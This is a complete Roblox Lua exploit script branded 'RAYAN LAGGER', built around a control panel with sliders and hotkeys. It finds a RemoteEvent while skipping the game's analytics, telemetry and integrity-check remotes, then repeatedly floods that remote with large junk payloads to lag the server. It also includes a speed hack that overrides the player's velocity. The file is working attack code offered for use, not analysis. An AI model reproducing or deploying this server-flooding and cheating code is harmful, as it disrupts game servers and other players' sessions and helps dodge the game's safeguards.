local Players = game:GetService("Players")
local player = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local playerGui = player:WaitForChild("PlayerGui")
local isLagging = false
local speedEnabled = false
local speedConn = nil
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
local power = 5
local speedPower = 50
local SPEED_MULTIPLIER = 1.2
local target = nil
local fireLoop = nil

-- Color scheme
local COLORS = {
    PRIMARY = Color3.fromRGB(10, 20, 40),
    SECONDARY = Color3.fromRGB(20, 40, 80),
    ACCENT = Color3.fromRGB(60, 140, 255),
    ACCENT_DARK = Color3.fromRGB(40, 100, 200),
    TEXT = Color3.fromRGB(220, 230, 255),
    TEXT_DIM = Color3.fromRGB(150, 170, 200),
    SUCCESS = Color3.fromRGB(60, 200, 100),
    ERROR = Color3.fromRGB(255, 80, 80),
    WARNING = Color3.fromRGB(255, 180, 60),
    BG_DARK = Color3.fromRGB(15, 25, 45),
    SLIDER_BG = Color3.fromRGB(25, 45, 85),
    BUTTON_ACTIVE = Color3.fromRGB(30, 70, 140),
    BUTTON_INACTIVE = Color3.fromRGB(30, 50, 90)
}

local function showNotification(text, color)
    local notifGui = Instance.new("ScreenGui")
    notifGui.Name = "SpeedNotification_" .. tick()
    notifGui.Parent = playerGui
    notifGui.ResetOnSpawn = false
    notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local notifFrame = Instance.new("Frame")
    notifFrame.Size = UDim2.new(0, 160, 0, 40)
    notifFrame.Position = UDim2.new(1, 200, 0.5, -20)
    notifFrame.BackgroundColor3 = COLORS.BG_DARK
    notifFrame.BorderSizePixel = 0
    notifFrame.Parent = notifGui
    
    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 8)
    notifCorner.Parent = notifFrame
    
    local notifStroke = Instance.new("UIStroke")
    notifStroke.Color = COLORS.ACCENT
    notifStroke.Thickness = 2
    notifStroke.Parent = notifFrame
    
    local notifLabel = Instance.new("TextLabel")
    notifLabel.Size = UDim2.new(1, -16, 1, 0)
    notifLabel.Position = UDim2.new(0, 8, 0, 0)
    notifLabel.BackgroundTransparency = 1
    notifLabel.Text = text
    notifLabel.TextColor3 = COLORS.TEXT
    notifLabel.TextSize = 12
    notifLabel.Font = Enum.Font.GothamBold
    notifLabel.TextXAlignment = Enum.TextXAlignment.Center
    notifLabel.Parent = notifFrame
    
    local slideIn = TweenService:Create(notifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(1, -180, 0.5, -20)
    })
    slideIn:Play()
    
    task.delay(2, function()
        local slideOut = TweenService:Create(notifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Position = UDim2.new(1, 200, 0.5, -20)
        })
        slideOut:Play()
        slideOut.Completed:Connect(function()
            notifGui:Destroy()
        end)
    end)
end

local function findTarget()
    local foundRemotes = {}
    local priorityTargets = {
        "WhyAreTheyTargetingMe!!",
        "FisherMan",
        "Chat",
        "AFK",
        "CookiesService"
    }
    
    local blacklistedNames = {
        "PlaceCooldownFromChat",
        "AdminPanelService",
        "AdminPanel",
        "IntegrityCheckProcessor",
        "LocalizationTableAnalyticsSender",
        "LocalizationService",
        "Analytics",
        "Telemetry",
        "Logger",
        "Reporter",
        "CanChatWith",
        "SetPlayerBlockList",
        "UpdatePlayerBlockList",
        "NewPlayerGroupDetails",
        "NewPlayerCanManageDetails",
        "SendPlayerBlockList",
        "UpdateLocalPlayerBlockList",
        "SendPlayerProfileSettings",
        "RequestPlayerProfileSettings",
        "UpdatePlayerProfileSettings",
        "ShowFriendJoinedPlayerToast",
        "ShowPlayerJoinedFriendsToast",
        "CreateOrJoinParty",
        "ServerSideBulkPurchaseEvent",
        "SetDialogInUse",
        "ContactListInvokeIrisInvite",
        "ContactListIrisInviteTeleport",
        "UpdateCurrentCall",
        "RequestDeviceCameraOrientationCapability",
        "ReceiveLikelySpeakingUsers",
        "ReferredPlayerJoin",
        "Update",
        "RE/Tools/Cooldown",
        "RE/FuseMachine/RevealNow",
        "RE/FuseMachine/FuseAnimation",
        "RE/NotificationService/Notify",
        "RE/PlotService/ClaimCoins",
        "RE/PlotService/Sell",
        "RE/PlotService/Open",
        "RE/PlotService/ToggleFriends",
        "RE/PlotService/CashCollected",
        "RE/ChatService/ChatMessage",
        "RE/SoundService/PlayClientSound",
        "RE/Snapshot/RealiableChannel",
        "RE/CommandsService/OpenCommandBar",
        "RE/92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
        "92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
        "6411a778-07a5-4513-b1c7-60b65ae05ac8",
        "RE/GameService/SpawnEffect",
        "RE/Leaderboard/ReplicateDisplayNames",
        "eb9dee81-7718-4020-b6b2-219888488d13",
        "fce51e06-a587-4ff0-9e19-869eb1859a01",
        "680db8c7-c46a-492c-b451-6e980910902c",
        "RE/StealService/Grab",
        "RE/PlotService/Place",
        "RE/StealService/StealingSuccess",
        "RE/StealService/StealingFailure",
        "RE/CombatService/ApplyImpulse",
        "RE/InventoryService/Sort",
        "RE/StockEventService/SetFocused",
        "RE/StockEventService/Return",
        "RE/StockEventService/Redeem",
        "RE/MerchantService/SetFocused",
        "RE/MerchantService/Animation",
        "RE/SantaMerchantService/SetFocused",
        "RE/SantaMerchantService/Animation",
        "RE/SantaMerchantService/CollectGoldElf",
        "RE/ShopService/Purchase",
        "RE/TutorialService/StartTutorial",
        "RE/TutorialService/FinishTutorial",
        "RE/TeleportService/Reconnect"
    }
    
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local fullName = v:GetFullName()
            local remoteName = v.Name
            
            local isBlacklisted = false
            for _, blacklisted in ipairs(blacklistedNames) do
                if string.find(fullName, blacklisted, 1, true) or string.find(remoteName, blacklisted, 1, true) then
                    isBlacklisted = true
                    break
                end
            end
            
            if not isBlacklisted then
                local isPriority = false
                for _, priority in ipairs(priorityTargets) do
                    if string.find(remoteName, priority, 1, true) then
                        isPriority = true
                        table.insert(foundRemotes, 1, v)
                        break
                    end
                end
                
                if not isPriority then
                    table.insert(foundRemotes, v)
                end
            end
        end
    end
    
    if #foundRemotes > 0 then
        return foundRemotes[1]
    end
    
    return nil
end

local function setSpeed(enable)
    if speedEnabled == enable then return end
    speedEnabled = enable
    
    if speedConn then
        speedConn:Disconnect()
        speedConn = nil
    end
    
    if speedEnabled then
        speedConn = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if not char then return end
            
            local hum = char:FindFirstChildOfClass("Humanoid")
            local hrp = char:FindFirstChild("HumanoidRootPart")
            
            if not hum or not hrp then return end
            
            local moveDir = hum.MoveDirection
            if moveDir.Magnitude > 0 then
                hrp.AssemblyLinearVelocity = Vector3.new(
                    moveDir.X * speedPower,
                    hrp.AssemblyLinearVelocity.Y,
                    moveDir.Z * speedPower
                )
            end
        end)
        
        showNotification("âœ“ Speed ON", COLORS.SUCCESS)
    else
        showNotification("âœ— Speed OFF", COLORS.ERROR)
    end
    
    updateUI()
end

local function tweenProp(obj, props, duration, style, direction)
    if not obj or not obj.Parent then return end
    local tween = TweenService:Create(obj, TweenInfo.new(
        duration or 0.2,
        style or Enum.EasingStyle.Quint,
        direction or Enum.EasingDirection.Out
    ), props)
    tween:Play()
    return tween
end

local powerLabel, targetLabel, statusLabel, speedStatusLabel, speedPowerLabel, sliderFill, speedSliderFill, lagButton, speedButton, speedInputBox

function updateUI()
    pcall(function()
        if powerLabel and powerLabel.Parent then
            local percentage = math.floor((power / 200) * 100)
            local pkts = power * 1800
            powerLabel.Text = string.format("POWER: %d%% (%d pkts)", percentage, pkts)
        end
        if speedPowerLabel and speedPowerLabel.Parent then
            speedPowerLabel.Text = string.format("SPEED: %d", speedPower)
        end
        if speedInputBox and speedInputBox.Parent then
            if not speedInputBox:IsFocused() then
                speedInputBox.Text = tostring(speedPower)
            end
        end
        if targetLabel and targetLabel.Parent then
            if target and target.Parent then
                targetLabel.Text = "TARGET: " .. target.Name
                targetLabel.TextColor3 = COLORS.WARNING
            else
                targetLabel.Text = "TARGET: NONE"
                targetLabel.TextColor3 = COLORS.TEXT_DIM
            end
        end
        if statusLabel and statusLabel.Parent then
            if isLagging then
                statusLabel.Text = "ACTIVE"
                statusLabel.TextColor3 = COLORS.ACCENT
            else
                statusLabel.Text = "IDLE"
                statusLabel.TextColor3 = COLORS.TEXT_DIM
            end
        end
        if speedStatusLabel and speedStatusLabel.Parent then
            if speedEnabled then
                speedStatusLabel.Text = "SPEED: ON"
                speedStatusLabel.TextColor3 = COLORS.SUCCESS
            else
                speedStatusLabel.Text = "SPEED: OFF"
                speedStatusLabel.TextColor3 = COLORS.ERROR
            end
        end
        if speedButton and speedButton.Parent then
            if speedEnabled then
                speedButton.BackgroundColor3 = COLORS.BUTTON_ACTIVE
                speedButton.Text = "âœ“ SPEED ON"
            else
                speedButton.BackgroundColor3 = COLORS.BUTTON_INACTIVE
                speedButton.Text = "â–¶ ENABLE SPEED"
            end
        end
        if lagButton and lagButton.Parent then
            if isLagging then
                lagButton.BackgroundColor3 = COLORS.ACCENT_DARK
                lagButton.Text = "â¹ STOP LAGGER"
            else
                lagButton.BackgroundColor3 = COLORS.BUTTON_INACTIVE
                lagButton.Text = "â–¶ LAG SERVER"
            end
        end
    end)
end

local function updatePower(newPower)
    power = math.clamp(math.floor(newPower or power), 1, 200)
    updateUI()
    
    if sliderFill and sliderFill.Parent then
        local percentage = (power - 1) / 199
        tweenProp(sliderFill, {Size = UDim2.new(percentage, 0, 1, 0)}, 0.1, Enum.EasingStyle.Sine)
    end
end

local function updateSpeedPower(newSpeed)
    speedPower = math.clamp(math.floor(newSpeed or speedPower), 1, 100)
    updateUI()
    
    if speedSliderFill and speedSliderFill.Parent then
        local percentage = (speedPower - 1) / 99
        tweenProp(speedSliderFill, {Size = UDim2.new(percentage, 0, 1, 0)}, 0.1, Enum.EasingStyle.Sine)
    end
end

local function toggleLag()
    isLagging = not isLagging
    
    if isLagging then
        if not target or not target.Parent then
            target = findTarget()
        end
        
        if not target then
            isLagging = false
            showNotification("âœ— NO TARGET", COLORS.ERROR)
            return
        end
        
        showNotification("â–¶ LAGGER STARTED", COLORS.ACCENT)
        
        fireLoop = task.spawn(function()
            while isLagging do
                if not target or not target.Parent then
                    target = findTarget()
                    
                    if not target then
                        isLagging = false
                        showNotification("— TARGET LOST", COLORS.ERROR)
                        break
                    end
                end
                
                local payloadSize = power * 150
                local payload = string.rep("X", payloadSize)
                
                local fireCount = math.max(1, math.floor(power / 50))
                for i = 1, fireCount do
                    pcall(function()
                        target:FireServer(uuid, payload)
                    end)
                end
                
                task.wait(0.535)
            end
        end)
    else
        if fireLoop then
            task.cancel(fireLoop)
            fireLoop = nil
        end
        showNotification("LAGGER STOPPED", COLORS.SUCCESS)
    end
    
    updateUI()
end

repeat task.wait() until game:IsLoaded()
task.wait(7)
target = findTarget()
updateUI()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CookieLagger_" .. tick()
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.U then
        if screenGui then
            screenGui.Enabled = not screenGui.Enabled
        end
    elseif not processed and input.KeyCode == Enum.KeyCode.R then
        toggleLag()
    elseif not processed and input.KeyCode == Enum.KeyCode.Q then
        setSpeed(not speedEnabled)
    end
end)

-- Compact GUI size
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 240, 0, 240) -- Reduced from 260x280
mainFrame.Position = UDim2.new(0.5, -120, 0.5, -120)
mainFrame.BackgroundColor3 = COLORS.PRIMARY
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.ClipsDescendants = true

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 8) -- Smaller radius
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = COLORS.ACCENT
mainStroke.Thickness = 2
mainStroke.Parent = mainFrame

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 32) -- Compact header
header.BackgroundTransparency = 1
header.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 18)
title.Position = UDim2.new(0, 10, 0, 4)
title.BackgroundTransparency = 1
title.Text = "RAYAN LAGGER"
title.TextColor3 = COLORS.ACCENT
title.TextSize = 16 -- Smaller text
title.Font = Enum.Font.GothamBlack
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -40, 0, 10)
subtitle.Position = UDim2.new(0, 10, 0, 20)
subtitle.BackgroundTransparency = 1
subtitle.Text = "RAYAN LAGGER | LAGGER BIENTOT AMELIRORÉ"
subtitle.TextColor3 = COLORS.TEXT_DIM
subtitle.TextSize = 9 -- Smaller text
subtitle.Font = Enum.Font.GothamBold
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = header

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 22, 0, 22) -- Smaller button
closeBtn.Position = UDim2.new(1, -28, 0, 5)
closeBtn.BackgroundColor3 = COLORS.ERROR
closeBtn.Text = "X"
closeBtn.TextColor3 = COLORS.TEXT
closeBtn.TextSize = 12
closeBtn.Font = Enum.Font.GothamBlack
closeBtn.Parent = header

local closeBtnCorner = Instance.new("UICorner")
closeBtnCorner.CornerRadius = UDim.new(0, 5)
closeBtnCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    if isLagging then
        isLagging = false
        if fireLoop then task.cancel(fireLoop) end
    end
    if speedEnabled then
        setSpeed(false)
    end
    screenGui:Destroy()
end)

local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, -16, 1, -48) -- Adjusted for compact size
contentFrame.Position = UDim2.new(0, 8, 0, 36) -- Adjusted position
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

-- Compact power section
local powerSection = Instance.new("Frame")
powerSection.Size = UDim2.new(1, 0, 0, 60) -- Reduced height
powerSection.BackgroundColor3 = COLORS.SECONDARY
powerSection.BorderSizePixel = 0
powerSection.Parent = contentFrame

local powerSectionCorner = Instance.new("UICorner")
powerSectionCorner.CornerRadius = UDim.new(0, 5)
powerSectionCorner.Parent = powerSection

local powerSectionStroke = Instance.new("UIStroke")
powerSectionStroke.Color = COLORS.BG_DARK
powerSectionStroke.Thickness = 1
powerSectionStroke.Parent = powerSection

powerLabel = Instance.new("TextLabel")
powerLabel.Size = UDim2.new(1, -16, 0, 14)
powerLabel.Position = UDim2.new(0, 8, 0, 4)
powerLabel.BackgroundTransparency = 1
powerLabel.Text = "POWER: 5% (300 pkts)"
powerLabel.TextColor3 = COLORS.TEXT
powerLabel.TextSize = 9 -- Smaller text
powerLabel.Font = Enum.Font.GothamBold
powerLabel.TextXAlignment = Enum.TextXAlignment.Left
powerLabel.Parent = powerSection

-- Compact info row
targetLabel = Instance.new("TextLabel")
targetLabel.Size = UDim2.new(0.5, -8, 0, 12)
targetLabel.Position = UDim2.new(0, 8, 0, 20)
targetLabel.BackgroundTransparency = 1
targetLabel.Text = "TARGET: SEARCHING..."
targetLabel.TextColor3 = COLORS.TEXT_DIM
targetLabel.TextSize = 7 -- Smaller text
targetLabel.Font = Enum.Font.Gotham
targetLabel.TextXAlignment = Enum.TextXAlignment.Left
targetLabel.Parent = powerSection

statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.25, 0, 0, 12)
statusLabel.Position = UDim2.new(0.5, 0, 0, 20)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "IDLE"
statusLabel.TextColor3 = COLORS.TEXT_DIM
statusLabel.TextSize = 7 -- Smaller text
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Parent = powerSection

speedStatusLabel = Instance.new("TextLabel")
speedStatusLabel.Size = UDim2.new(0.25, 0, 0, 12)
speedStatusLabel.Position = UDim2.new(0.75, 0, 0, 20)
speedStatusLabel.BackgroundTransparency = 1
speedStatusLabel.Text = "SPEED: OFF"
speedStatusLabel.TextColor3 = COLORS.ERROR
speedStatusLabel.TextSize = 7 -- Smaller text
speedStatusLabel.Font = Enum.Font.GothamBold
speedStatusLabel.TextXAlignment = Enum.TextXAlignment.Right
speedStatusLabel.Parent = powerSection

local sliderBg = Instance.new("Frame")
sliderBg.Size = UDim2.new(1, -16, 0, 5) -- Thinner slider
sliderBg.Position = UDim2.new(0, 8, 0, 38)
sliderBg.BackgroundColor3 = COLORS.SLIDER_BG
sliderBg.BorderSizePixel = 0
sliderBg.Parent = powerSection

local sliderBgCorner = Instance.new("UICorner")
sliderBgCorner.CornerRadius = UDim.new(1, 0)
sliderBgCorner.Parent = sliderBg

sliderFill = Instance.new("Frame")
sliderFill.Size = UDim2.new(0.2, 0, 1, 0)
sliderFill.BackgroundColor3 = COLORS.ACCENT
sliderFill.BorderSizePixel = 0
sliderFill.Parent = sliderBg

local sliderFillCorner = Instance.new("UICorner")
sliderFillCorner.CornerRadius = UDim.new(1, 0)
sliderFillCorner.Parent = sliderFill

local sliderKnob = Instance.new("Frame")
sliderKnob.Size = UDim2.new(0, 10, 0, 10) -- Smaller knob
sliderKnob.Position = UDim2.new(1, -5, 0.5, -5)
sliderKnob.BackgroundColor3 = COLORS.TEXT
sliderKnob.BorderSizePixel = 0
sliderKnob.Parent = sliderFill

local sliderKnobCorner = Instance.new("UICorner")
sliderKnobCorner.CornerRadius = UDim.new(1, 0)
sliderKnobCorner.Parent = sliderKnob

local sliderButton = Instance.new("TextButton")
sliderButton.Size = UDim2.new(1, 0, 2, 0)
sliderButton.Position = UDim2.new(0, 0, -0.5, 0)
sliderButton.BackgroundTransparency = 1
sliderButton.Text = ""
sliderButton.Parent = sliderBg

-- Compact buttons
lagButton = Instance.new("TextButton")
lagButton.Size = UDim2.new(1, 0, 0, 28) -- Smaller buttons
lagButton.Position = UDim2.new(0, 0, 0, 68) -- Adjusted position
lagButton.BackgroundColor3 = COLORS.BUTTON_INACTIVE
lagButton.Text = "LAG SERVER"
lagButton.TextColor3 = COLORS.TEXT
lagButton.TextSize = 11 -- Smaller text
lagButton.Font = Enum.Font.GothamBlack
lagButton.Parent = contentFrame

local lagBtnCorner = Instance.new("UICorner")
lagBtnCorner.CornerRadius = UDim.new(0, 5)
lagBtnCorner.Parent = lagButton

local lagBtnStroke = Instance.new("UIStroke")
lagBtnStroke.Color = COLORS.ACCENT_DARK
lagBtnStroke.Thickness = 1
lagBtnStroke.Parent = lagButton

lagButton.MouseButton1Click:Connect(function()
    toggleLag()
end)

speedButton = Instance.new("TextButton")
speedButton.Size = UDim2.new(1, 0, 0, 28) -- Smaller buttons
speedButton.Position = UDim2.new(0, 0, 0, 102) -- Adjusted position
speedButton.BackgroundColor3 = COLORS.BUTTON_INACTIVE
speedButton.Text = "ENABLE SPEED"
speedButton.TextColor3 = COLORS.TEXT
speedButton.TextSize = 11 -- Smaller text
speedButton.Font = Enum.Font.GothamBlack
speedButton.Parent = contentFrame

local speedBtnCorner = Instance.new("UICorner")
speedBtnCorner.CornerRadius = UDim.new(0, 5)
speedBtnCorner.Parent = speedButton

local speedBtnStroke = Instance.new("UIStroke")
speedBtnStroke.Color = COLORS.ACCENT_DARK
speedBtnStroke.Thickness = 1
speedBtnStroke.Parent = speedButton

speedButton.MouseButton1Click:Connect(function()
    setSpeed(not speedEnabled)
end)

-- Compact speed section
local speedSection = Instance.new("Frame")
speedSection.Size = UDim2.new(1, 0, 0, 60) -- Reduced height
speedSection.Position = UDim2.new(0, 0, 0, 140) -- Adjusted position
speedSection.BackgroundColor3 = COLORS.SECONDARY
speedSection.BorderSizePixel = 0
speedSection.Parent = contentFrame

local speedSectionCorner = Instance.new("UICorner")
speedSectionCorner.CornerRadius = UDim.new(0, 5)
speedSectionCorner.Parent = speedSection

local speedSectionStroke = Instance.new("UIStroke")
speedSectionStroke.Color = COLORS.BG_DARK
speedSectionStroke.Thickness = 1
speedSectionStroke.Parent = speedSection

speedPowerLabel = Instance.new("TextLabel")
speedPowerLabel.Size = UDim2.new(0.6, -8, 0, 14)
speedPowerLabel.Position = UDim2.new(0, 8, 0, 4)
speedPowerLabel.BackgroundTransparency = 1
speedPowerLabel.Text = "SPEED: 50"
speedPowerLabel.TextColor3 = COLORS.TEXT
speedPowerLabel.TextSize = 9 -- Smaller text
speedPowerLabel.Font = Enum.Font.GothamBold
speedPowerLabel.TextXAlignment = Enum.TextXAlignment.Left
speedPowerLabel.Parent = speedSection

speedInputBox = Instance.new("TextBox")
speedInputBox.Size = UDim2.new(0.35, 0, 0, 20) -- Smaller input
speedInputBox.Position = UDim2.new(0.62, 0, 0, 4)
speedInputBox.BackgroundColor3 = COLORS.BG_DARK
speedInputBox.Text = "50"
speedInputBox.TextColor3 = COLORS.TEXT
speedInputBox.TextSize = 10 -- Smaller text
speedInputBox.Font = Enum.Font.GothamBold
speedInputBox.PlaceholderText = "1-100"
speedInputBox.PlaceholderColor3 = COLORS.TEXT_DIM
speedInputBox.ClearTextOnFocus = false
speedInputBox.Parent = speedSection

local speedInputCorner = Instance.new("UICorner")
speedInputCorner.CornerRadius = UDim.new(0, 3)
speedInputCorner.Parent = speedInputBox

local speedInputStroke = Instance.new("UIStroke")
speedInputStroke.Color = COLORS.ACCENT_DARK
speedInputStroke.Thickness = 1
speedInputStroke.Parent = speedInputBox

speedInputBox.FocusLost:Connect(function(enterPressed)
    local inputValue = tonumber(speedInputBox.Text)
    if inputValue then
        inputValue = math.clamp(math.floor(inputValue), 1, 100)
        updateSpeedPower(inputValue)
        speedInputBox.Text = tostring(speedPower)
    else
        speedInputBox.Text = tostring(speedPower)
    end
end)

local speedSliderBg = Instance.new("Frame")
speedSliderBg.Size = UDim2.new(1, -16, 0, 5) -- Thinner slider
speedSliderBg.Position = UDim2.new(0, 8, 0, 32)
speedSliderBg.BackgroundColor3 = COLORS.SLIDER_BG
speedSliderBg.BorderSizePixel = 0
speedSliderBg.Parent = speedSection

local speedSliderBgCorner = Instance.new("UICorner")
speedSliderBgCorner.CornerRadius = UDim.new(1, 0)
speedSliderBgCorner.Parent = speedSliderBg

speedSliderFill = Instance.new("Frame")
speedSliderFill.Size = UDim2.new(0.5, 0, 1, 0)
speedSliderFill.BackgroundColor3 = COLORS.SUCCESS
speedSliderFill.BorderSizePixel = 0
speedSliderFill.Parent = speedSliderBg

local speedSliderFillCorner = Instance.new("UICorner")
speedSliderFillCorner.CornerRadius = UDim.new(1, 0)
speedSliderFillCorner.Parent = speedSliderFill

local speedSliderKnob = Instance.new("Frame")
speedSliderKnob.Size = UDim2.new(0, 10, 0, 10) -- Smaller knob
speedSliderKnob.Position = UDim2.new(1, -5, 0.5, -5)
speedSliderKnob.BackgroundColor3 = COLORS.TEXT
speedSliderKnob.BorderSizePixel = 0
speedSliderKnob.Parent = speedSliderFill

local speedSliderKnobCorner = Instance.new("UICorner")
speedSliderKnobCorner.CornerRadius = UDim.new(1, 0)
speedSliderKnobCorner.Parent = speedSliderKnob

local speedSliderButton = Instance.new("TextButton")
speedSliderButton.Size = UDim2.new(1, 0, 2, 0)
speedSliderButton.Position = UDim2.new(0, 0, -0.5, 0)
speedSliderButton.BackgroundTransparency = 1
speedSliderButton.Text = ""
speedSliderButton.Parent = speedSliderBg

local speedMinLabel = Instance.new("TextLabel")
speedMinLabel.Size = UDim2.new(0, 16, 0, 10)
speedMinLabel.Position = UDim2.new(0, 8, 0, 42)
speedMinLabel.BackgroundTransparency = 1
speedMinLabel.Text = "1"
speedMinLabel.TextColor3 = COLORS.TEXT_DIM
speedMinLabel.TextSize = 7 -- Smaller text
speedMinLabel.Font = Enum.Font.Gotham
speedMinLabel.TextXAlignment = Enum.TextXAlignment.Left
speedMinLabel.Parent = speedSection

local speedMaxLabel = Instance.new("TextLabel")
speedMaxLabel.Size = UDim2.new(0, 20, 0, 10)
speedMaxLabel.Position = UDim2.new(1, -28, 0, 42)
speedMaxLabel.BackgroundTransparency = 1
speedMaxLabel.Text = "100"
speedMaxLabel.TextColor3 = COLORS.TEXT_DIM
speedMaxLabel.TextSize = 7 -- Smaller text
speedMaxLabel.Font = Enum.Font.Gotham
speedMaxLabel.TextXAlignment = Enum.TextXAlignment.Right
speedMaxLabel.Parent = speedSection

local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 10)
footer.Position = UDim2.new(0, 0, 1, -12)
footer.BackgroundTransparency = 1
footer.Text = "R=LAG | Q=SPEED | U=UI"
footer.TextColor3 = COLORS.TEXT_DIM
footer.TextSize = 8 -- Smaller text
footer.Font = Enum.Font.GothamBold
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.Parent = mainFrame

local draggingSlider = false
local draggingSpeedSlider = false

local function updateSliderPosition(inputPosition)
    local relativeX = math.clamp((inputPosition.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
    local newPower = math.floor(1 + relativeX * 199)
    updatePower(newPower)
end

local function updateSpeedSliderPosition(inputPosition)
    local relativeX = math.clamp((inputPosition.X - speedSliderBg.AbsolutePosition.X) / speedSliderBg.AbsoluteSize.X, 0, 1)
    local newSpeed = math.floor(1 + relativeX * 99)
    updateSpeedPower(newSpeed)
end

sliderButton.MouseButton1Down:Connect(function()
    draggingSlider = true
end)

speedSliderButton.MouseButton1Down:Connect(function()
    draggingSpeedSlider = true
end)

sliderButton.TouchTap:Connect(function(inputPositions)
    local pos = inputPositions[1]
    updateSliderPosition(Vector2.new(pos.x, pos.y))
end)

speedSliderButton.TouchTap:Connect(function(inputPositions)
    local pos = inputPositions[1]
    updateSpeedSliderPosition(Vector2.new(pos.x, pos.y))
end)

UserInputService.InputChanged:Connect(function(input)
    if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateSliderPosition(input.Position)
    end
    if draggingSpeedSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateSpeedSliderPosition(input.Position)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingSlider = false
        draggingSpeedSlider = false
    end
end)

local draggingFrame = false
local dragInput, dragStart, startPos

local function updateDrag(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingFrame = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingFrame = false
            end
        end)
    end
end)

header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and draggingFrame then
        updateDrag(input)
    end
end)

updatePower(5)
updateSpeedPower(50)
